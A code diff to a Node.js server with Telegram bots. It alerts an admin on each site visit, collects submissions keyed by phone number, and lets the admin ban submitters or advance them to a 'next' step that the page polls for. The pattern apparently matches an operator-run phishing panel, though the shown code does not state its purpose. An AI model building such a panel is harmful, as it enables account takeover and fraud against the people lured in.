@@ -17,29 +17,29 @@ const enterBot = new TelegramBot(process.env.ENTER_BOT_TOKEN, { polling: true })
 
 const adminId = process.env.ADMIN_CHAT_ID;
 
-// база
+// базы
 let bannedUsers = {};
 let requests = {};
+let userStatus = {};
 
-// === ВХОД НА САЙТ ===
+// вход
 app.post("/enter", (req, res) => {
-  enterBot.sendMessage(adminId, "👀 Новый переход!");
+  enterBot.sendMessage(adminId, "👀 Пользователь зашел на сайт");
   res.json({ ok: true });
 });
 
-// === ПРИЕМ ЗАЯВОК ===
+// отправка
 app.post("/send", (req, res) => {
   const data = req.body;
 
-  // проверка бана
   if (bannedUsers[data.phone]) {
     return res.json({ ok: false });
   }
 
   const id = Date.now();
 
-  // сохраняем связь
   requests[id] = data.phone;
+  userStatus[id] = "wait";
 
   mainBot.sendMessage(
     adminId,
@@ -60,21 +60,26 @@ app.post("/send", (req, res) => {
             { text: "✅ Разбан", callback_data: "unban_" + id }
           ],
           [
-            { text: "➡️ Разрешить", callback_data: "allow_" + id }
+            { text: "➡️ ДАЛЬШЕ", callback_data: "allow_" + id }
           ]
         ]
       }
     }
-  ).catch(err => console.log("TG ERROR:", err.message));
+  );
 
-  res.json({ ok: true });
+  res.json({ ok: true, id });
 });
 
-// === КНОПКИ ===
+// статус
+app.get("/status/:id", (req, res) => {
+  const id = req.params.id;
+  res.json({ status: userStatus[id] || "wait" });
+});
+
+// кнопки
 mainBot.on("callback_query", (q) => {
   const data = q.data;
   const id = data.split("_")[1];
-
   const phone = requests[id];
 
   if (!phone) {
@@ -92,7 +97,8 @@ mainBot.on("callback_query", (q) => {
   }
 
   if (data.startsWith("allow")) {
-    mainBot.answerCallbackQuery(q.id, { text: "➡️ разрешено" });
+    userStatus[id] = "next";
+    mainBot.answerCallbackQuery(q.id, { text: "➡️ перевёл дальше" });
   }
 });
 
